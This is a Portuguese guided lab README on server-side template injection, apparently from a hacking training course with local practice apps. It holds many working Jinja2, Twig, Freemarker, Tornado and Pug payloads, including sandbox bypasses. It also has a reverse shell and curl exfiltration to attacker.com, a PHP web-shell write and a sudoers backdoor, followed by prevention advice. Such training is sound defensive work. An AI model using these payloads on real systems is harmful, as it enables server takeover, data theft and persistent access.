# 🎨 Server-Side Template Injection (SSTI) - Laboratório Guiado Completo

## 📋 Visão Geral

**Dificuldade**: 🟡 Intermediário → 🔴 Avançado
**Tempo estimado**: 4-6 horas
**Pontos**: 90 (15 + 30 + 45)

### O Que Você Vai Aprender

✅ Fundamentos de template engines
✅ SSTI em Jinja2 (Python/Flask)
✅ Sandbox escape techniques
✅ RCE via template injection
✅ Object traversal e introspection
✅ Polyglot payloads
✅ Detection e exploitation

---

## 📖 Teoria Completa

### O Que É SSTI?

Server-Side Template Injection ocorre quando aplicação incorpora input do usuário diretamente em templates server-side, permitindo execução de código no servidor.

### Template Engines Vulneráveis

- **Python**: Jinja2, Mako, Tornado
- **PHP**: Twig, Smarty
- **Java**: Freemarker, Velocity
- **Ruby**: ERB, Slim
- **JavaScript**: Pug, EJS, Handlebars

---

## 🐍 Jinja2 Template Injection

### Como Funciona?

**Jinja2** é o template engine do Flask.

**Uso seguro:**
```python
from flask import render_template

@app.route('/hello/<name>')
def hello(name):
    # SEGURO ✅ - name é variável, não código
    return render_template('hello.html', name=name)
```

**Template (hello.html):**
```html
<h1>Hello {{ name }}</h1>
```

**Uso inseguro:**
```python
from flask import render_template_string

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    # VULNERÁVEL ❌ - Input vai direto no template!
    template = f'<h1>Hello {{{{{ name }}}}</h1>'
    return render_template_string(template)
```

**Exploit:**
```
?name={{7*7}}
Output: <h1>Hello 49</h1>  # Código executado!
```

---

## 💣 Payloads Básicos

### 1. Detection

```jinja2
# Teste matemático
{{ 7*7 }}         → 49
{{ 7*'7' }}       → 7777777

# Teste de string
{{ "test" }}      → test
{{ 'test' }}      → test

# Variáveis existentes
{{ config }}      → <Config ...>
{{ request }}     → <Request ...>
{{ self }}        → <TemplateReference ...>
```

### 2. Information Disclosure

```jinja2
# Configuração da aplicação
{{ config }}
{{ config.items() }}

# SECRET_KEY
{{ config['SECRET_KEY'] }}

# Variáveis de ambiente
{{ config['ENV'] }}

# Request object
{{ request.args }}
{{ request.cookies }}
{{ request.headers }}
```

### 3. File Read

```jinja2
# Ler arquivo
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}

# Forma mais simples (se disponível)
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
```

---

## 🚀 RCE (Remote Code Execution)

### Exploiting Object Introspection

Python permite introspectar objetos em runtime:

```python
# Classe string
''.__class__              # <class 'str'>

# Classes pai
''.__class__.__mro__      # (<class 'str'>, <class 'object'>)

# Object class
''.__class__.__mro__[1]   # <class 'object'>

# Todas as subclasses de object
''.__class__.__mro__[1].__subclasses__()
# [<class 'type'>, <class 'weakref'>, ..., <class 'os._wrap_close'>, ...]
```

### Encontrando Classes Úteis

```python
# Procurar por classe específica
{% for i in range(500) %}
  {% if ''.__class__.__mro__[1].__subclasses__()[i].__name__ == 'Popen' %}
    INDEX: {{ i }}
  {% endif %}
{% endfor %}

# ou file
{% if ''.__class__.__mro__[1].__subclasses__()[40].__name__ == '_io._IOBase' %}
  # Pode abrir arquivos!
{% endif %}
```

### RCE Payload 1: via warnings.catch_warnings

```jinja2
{{''.__class__.__mro__[1].__subclasses__()[140].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
```

**Explicação:**
1. `''.__class__` → class 'str'
2. `.__mro__[1]` → class 'object'
3. `.__subclasses__()[140]` → warnings.catch_warnings (ou outro índice)
4. `.__init__.__globals__` → namespace global da classe
5. `['sys'].modules['os']` → módulo os
6. `.popen('id')` → executa comando
7. `.read()` → lê output

### RCE Payload 2: via subprocess.Popen

```jinja2
{{''.__class__.__base__.__subclasses__()[245]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
```

### RCE Payload 3: via config (se disponível)

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
```

---

## 🔓 Sandbox Escape

Jinja2 tem "sandbox" para bloquear acesso a objetos perigosos. Mas pode ser bypassado!

### Técnicas de Bypass

#### 1. Attribute Access Bypass

```jinja2
# Bloqueado
{{ ''.__class__ }}

# Bypass com []
{{ ''['__class__'] }}

# Bypass com attr()
{{ ''|attr('__class__') }}

# Bypass com getattr
{{ ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['getattr'](...) }}
```

#### 2. Import Bypass

```jinja2
# Se __import__ bloqueado
{{ ''.__class__.__mro__[1].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}

# Via lipsum (global disponível em Jinja2)
{{ lipsum.__globals__['os'].popen('id').read() }}

# Via cycler
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# Via joiner
{{ joiner.__init__.__globals__.os.popen('id').read() }}
```

#### 3. Blacklist Bypass

Se filtros bloqueiam palavras-chave:

```jinja2
# Concatenação
{{ ''['__cla'+'ss__'] }}

# Codificação
{{ ''['__\x63lass__'] }}

# Variáveis
{% set x = '__class__' %}{{ ''[x] }}

# Request smuggling
{{ request.args.x }}  onde ?x=__class__
```

---

## 🎯 Payloads por Objetivo

### 1. Listar Variáveis Disponíveis

```jinja2
{{ self.__dict__ }}
{{ self._TemplateReference__context }}

# Todas as variáveis globais
{% for key in self.__dict__ %}
  {{ key }}: {{ self.__dict__[key] }}
{% endfor %}
```

### 2. Reverse Shell

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"').read()}}
```

### 3. File Write (Backdoor)

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('echo "<?php system($_GET[0]); ?>" > /var/www/html/shell.php').read()}}
```

### 4. Exfiltração de Dados

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('curl http://attacker.com/?data=$(cat /etc/passwd | base64)').read()}}
```

### 5. Privilege Escalation

```jinja2
# Adicionar usuário sudo
{{config.__class__.__init__.__globals__['os'].popen('echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers').read()}}
```

---

## 🛠️ Ferramentas e Técnicas

### 1. Tplmap

```bash
# Scanner automático de SSTI
tplmap -u "http://target.com/page?name=test"

# Com cookie
tplmap -u "http://target.com/page" -c "session=abc123"

# POST data
tplmap -u "http://target.com/page" --data "name=test"
```

### 2. Manual Testing

```python
# Script para testar payloads
import requests

payloads = [
    "{{7*7}}",
    "{{7*'7'}}",
    "{{config}}",
    "{{config.items()}}",
    "{{''.__class__}}",
]

for payload in payloads:
    r = requests.get(f"http://target.com/page?name={payload}")
    print(f"Payload: {payload}")
    print(f"Response: {r.text}\n")
```

### 3. Burp Suite Intruder

Wordlist de payloads SSTI: [PayloadsAllTheThings/SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

---

## 🎭 Outros Template Engines

### Twig (PHP)

```twig
# Detection
{{7*7}}  → 49

# RCE
{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("id")}}
```

### Freemarker (Java)

```ftl
# Detection
${7*7}  → 49

# RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Tornado (Python)

```python
# Detection
{{7*7}}  → 49

# RCE
{% import os %}
{{os.popen("id").read()}}
```

### Pug (Node.js)

```pug
# Detection
#{7*7}  → 49

# RCE
#{function(){return global.process.mainModule.constructor._load('child_process').execSync('id').toString()}()}
```

---

## 🛡️ Prevenção

### 1. Nunca Use Input em Templates

```python
# CORRETO ✅
@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    return render_template('hello.html', name=name)

# VULNERÁVEL ❌
@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    template = f'<h1>Hello {{{{{ name }}}}</h1>'
    return render_template_string(template)
```

### 2. Use Sandbox Mode (com cuidado!)

```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string(user_input)
template.render()
```

**⚠️ Sandbox não é 100% seguro!** Existem bypasses conhecidos.

### 3. Whitelist de Variáveis

```python
# CORRETO ✅
ALLOWED_VARS = ['name', 'email', 'age']

def render_safe(template_str, user_data):
    safe_data = {k: v for k, v in user_data.items() if k in ALLOWED_VARS}
    return render_template_string(template_str, **safe_data)
```

### 4. Content Security Policy

```python
@app.after_request
def add_csp(response):
    response.headers['Content-Security-Policy'] = "script-src 'self'"
    return response
```

### 5. Input Validation

```python
import re

def validate_template_input(text):
    # Bloqueia {{ }}, {% %}, {# #}
    if re.search(r'\{\{|\{%|\{#', text):
        raise ValueError("Template syntax not allowed")
    return text
```

---

## 🎯 Estrutura do Laboratório

### 1. 🟢 Basic App (15 pontos)
- **Porta**: 5090
- **Cenário**: Gerador de cartões
- SSTI básico sem filtros
- Information disclosure
- File read

### 2. 🟡 Intermediate App (30 pontos)
- **Porta**: 5091
- **Cenário**: Custom template engine
- Sandbox escape
- Blacklist bypass
- RCE com restrições

### 3. 🔴 Advanced App (45 pontos)
- **Porta**: 5092
- **Cenário**: Multi-tenant platform
- Advanced sandbox bypass
- Polyglot injection
- Blind SSTI exploitation

---

## 📝 Checklist de Conclusão

- [ ] Entendi conceito de template injection
- [ ] Detectei SSTI com payload matemático
- [ ] Acessei variável config
- [ ] Li arquivo via SSTI
- [ ] Listei subclasses de object
- [ ] Obtive RCE via template injection
- [ ] Bypassei sandbox Jinja2
- [ ] Bypassei blacklist de palavras
- [ ] Obtive reverse shell
- [ ] Completei todos os exercícios

**Total**: 90 pontos

---

## 🎓 Próximos Passos

Após dominar SSTI:

1. **Client-Side Template Injection (CSTI)**
2. **Expression Language Injection**
3. **Template confusion attacks**
4. **Polyglot SSTI payloads**

**Próximo Lab**: [10 - XXE →](../10-xxe/README.md)

---

**Boa sorte e happy hacking! 🎨**
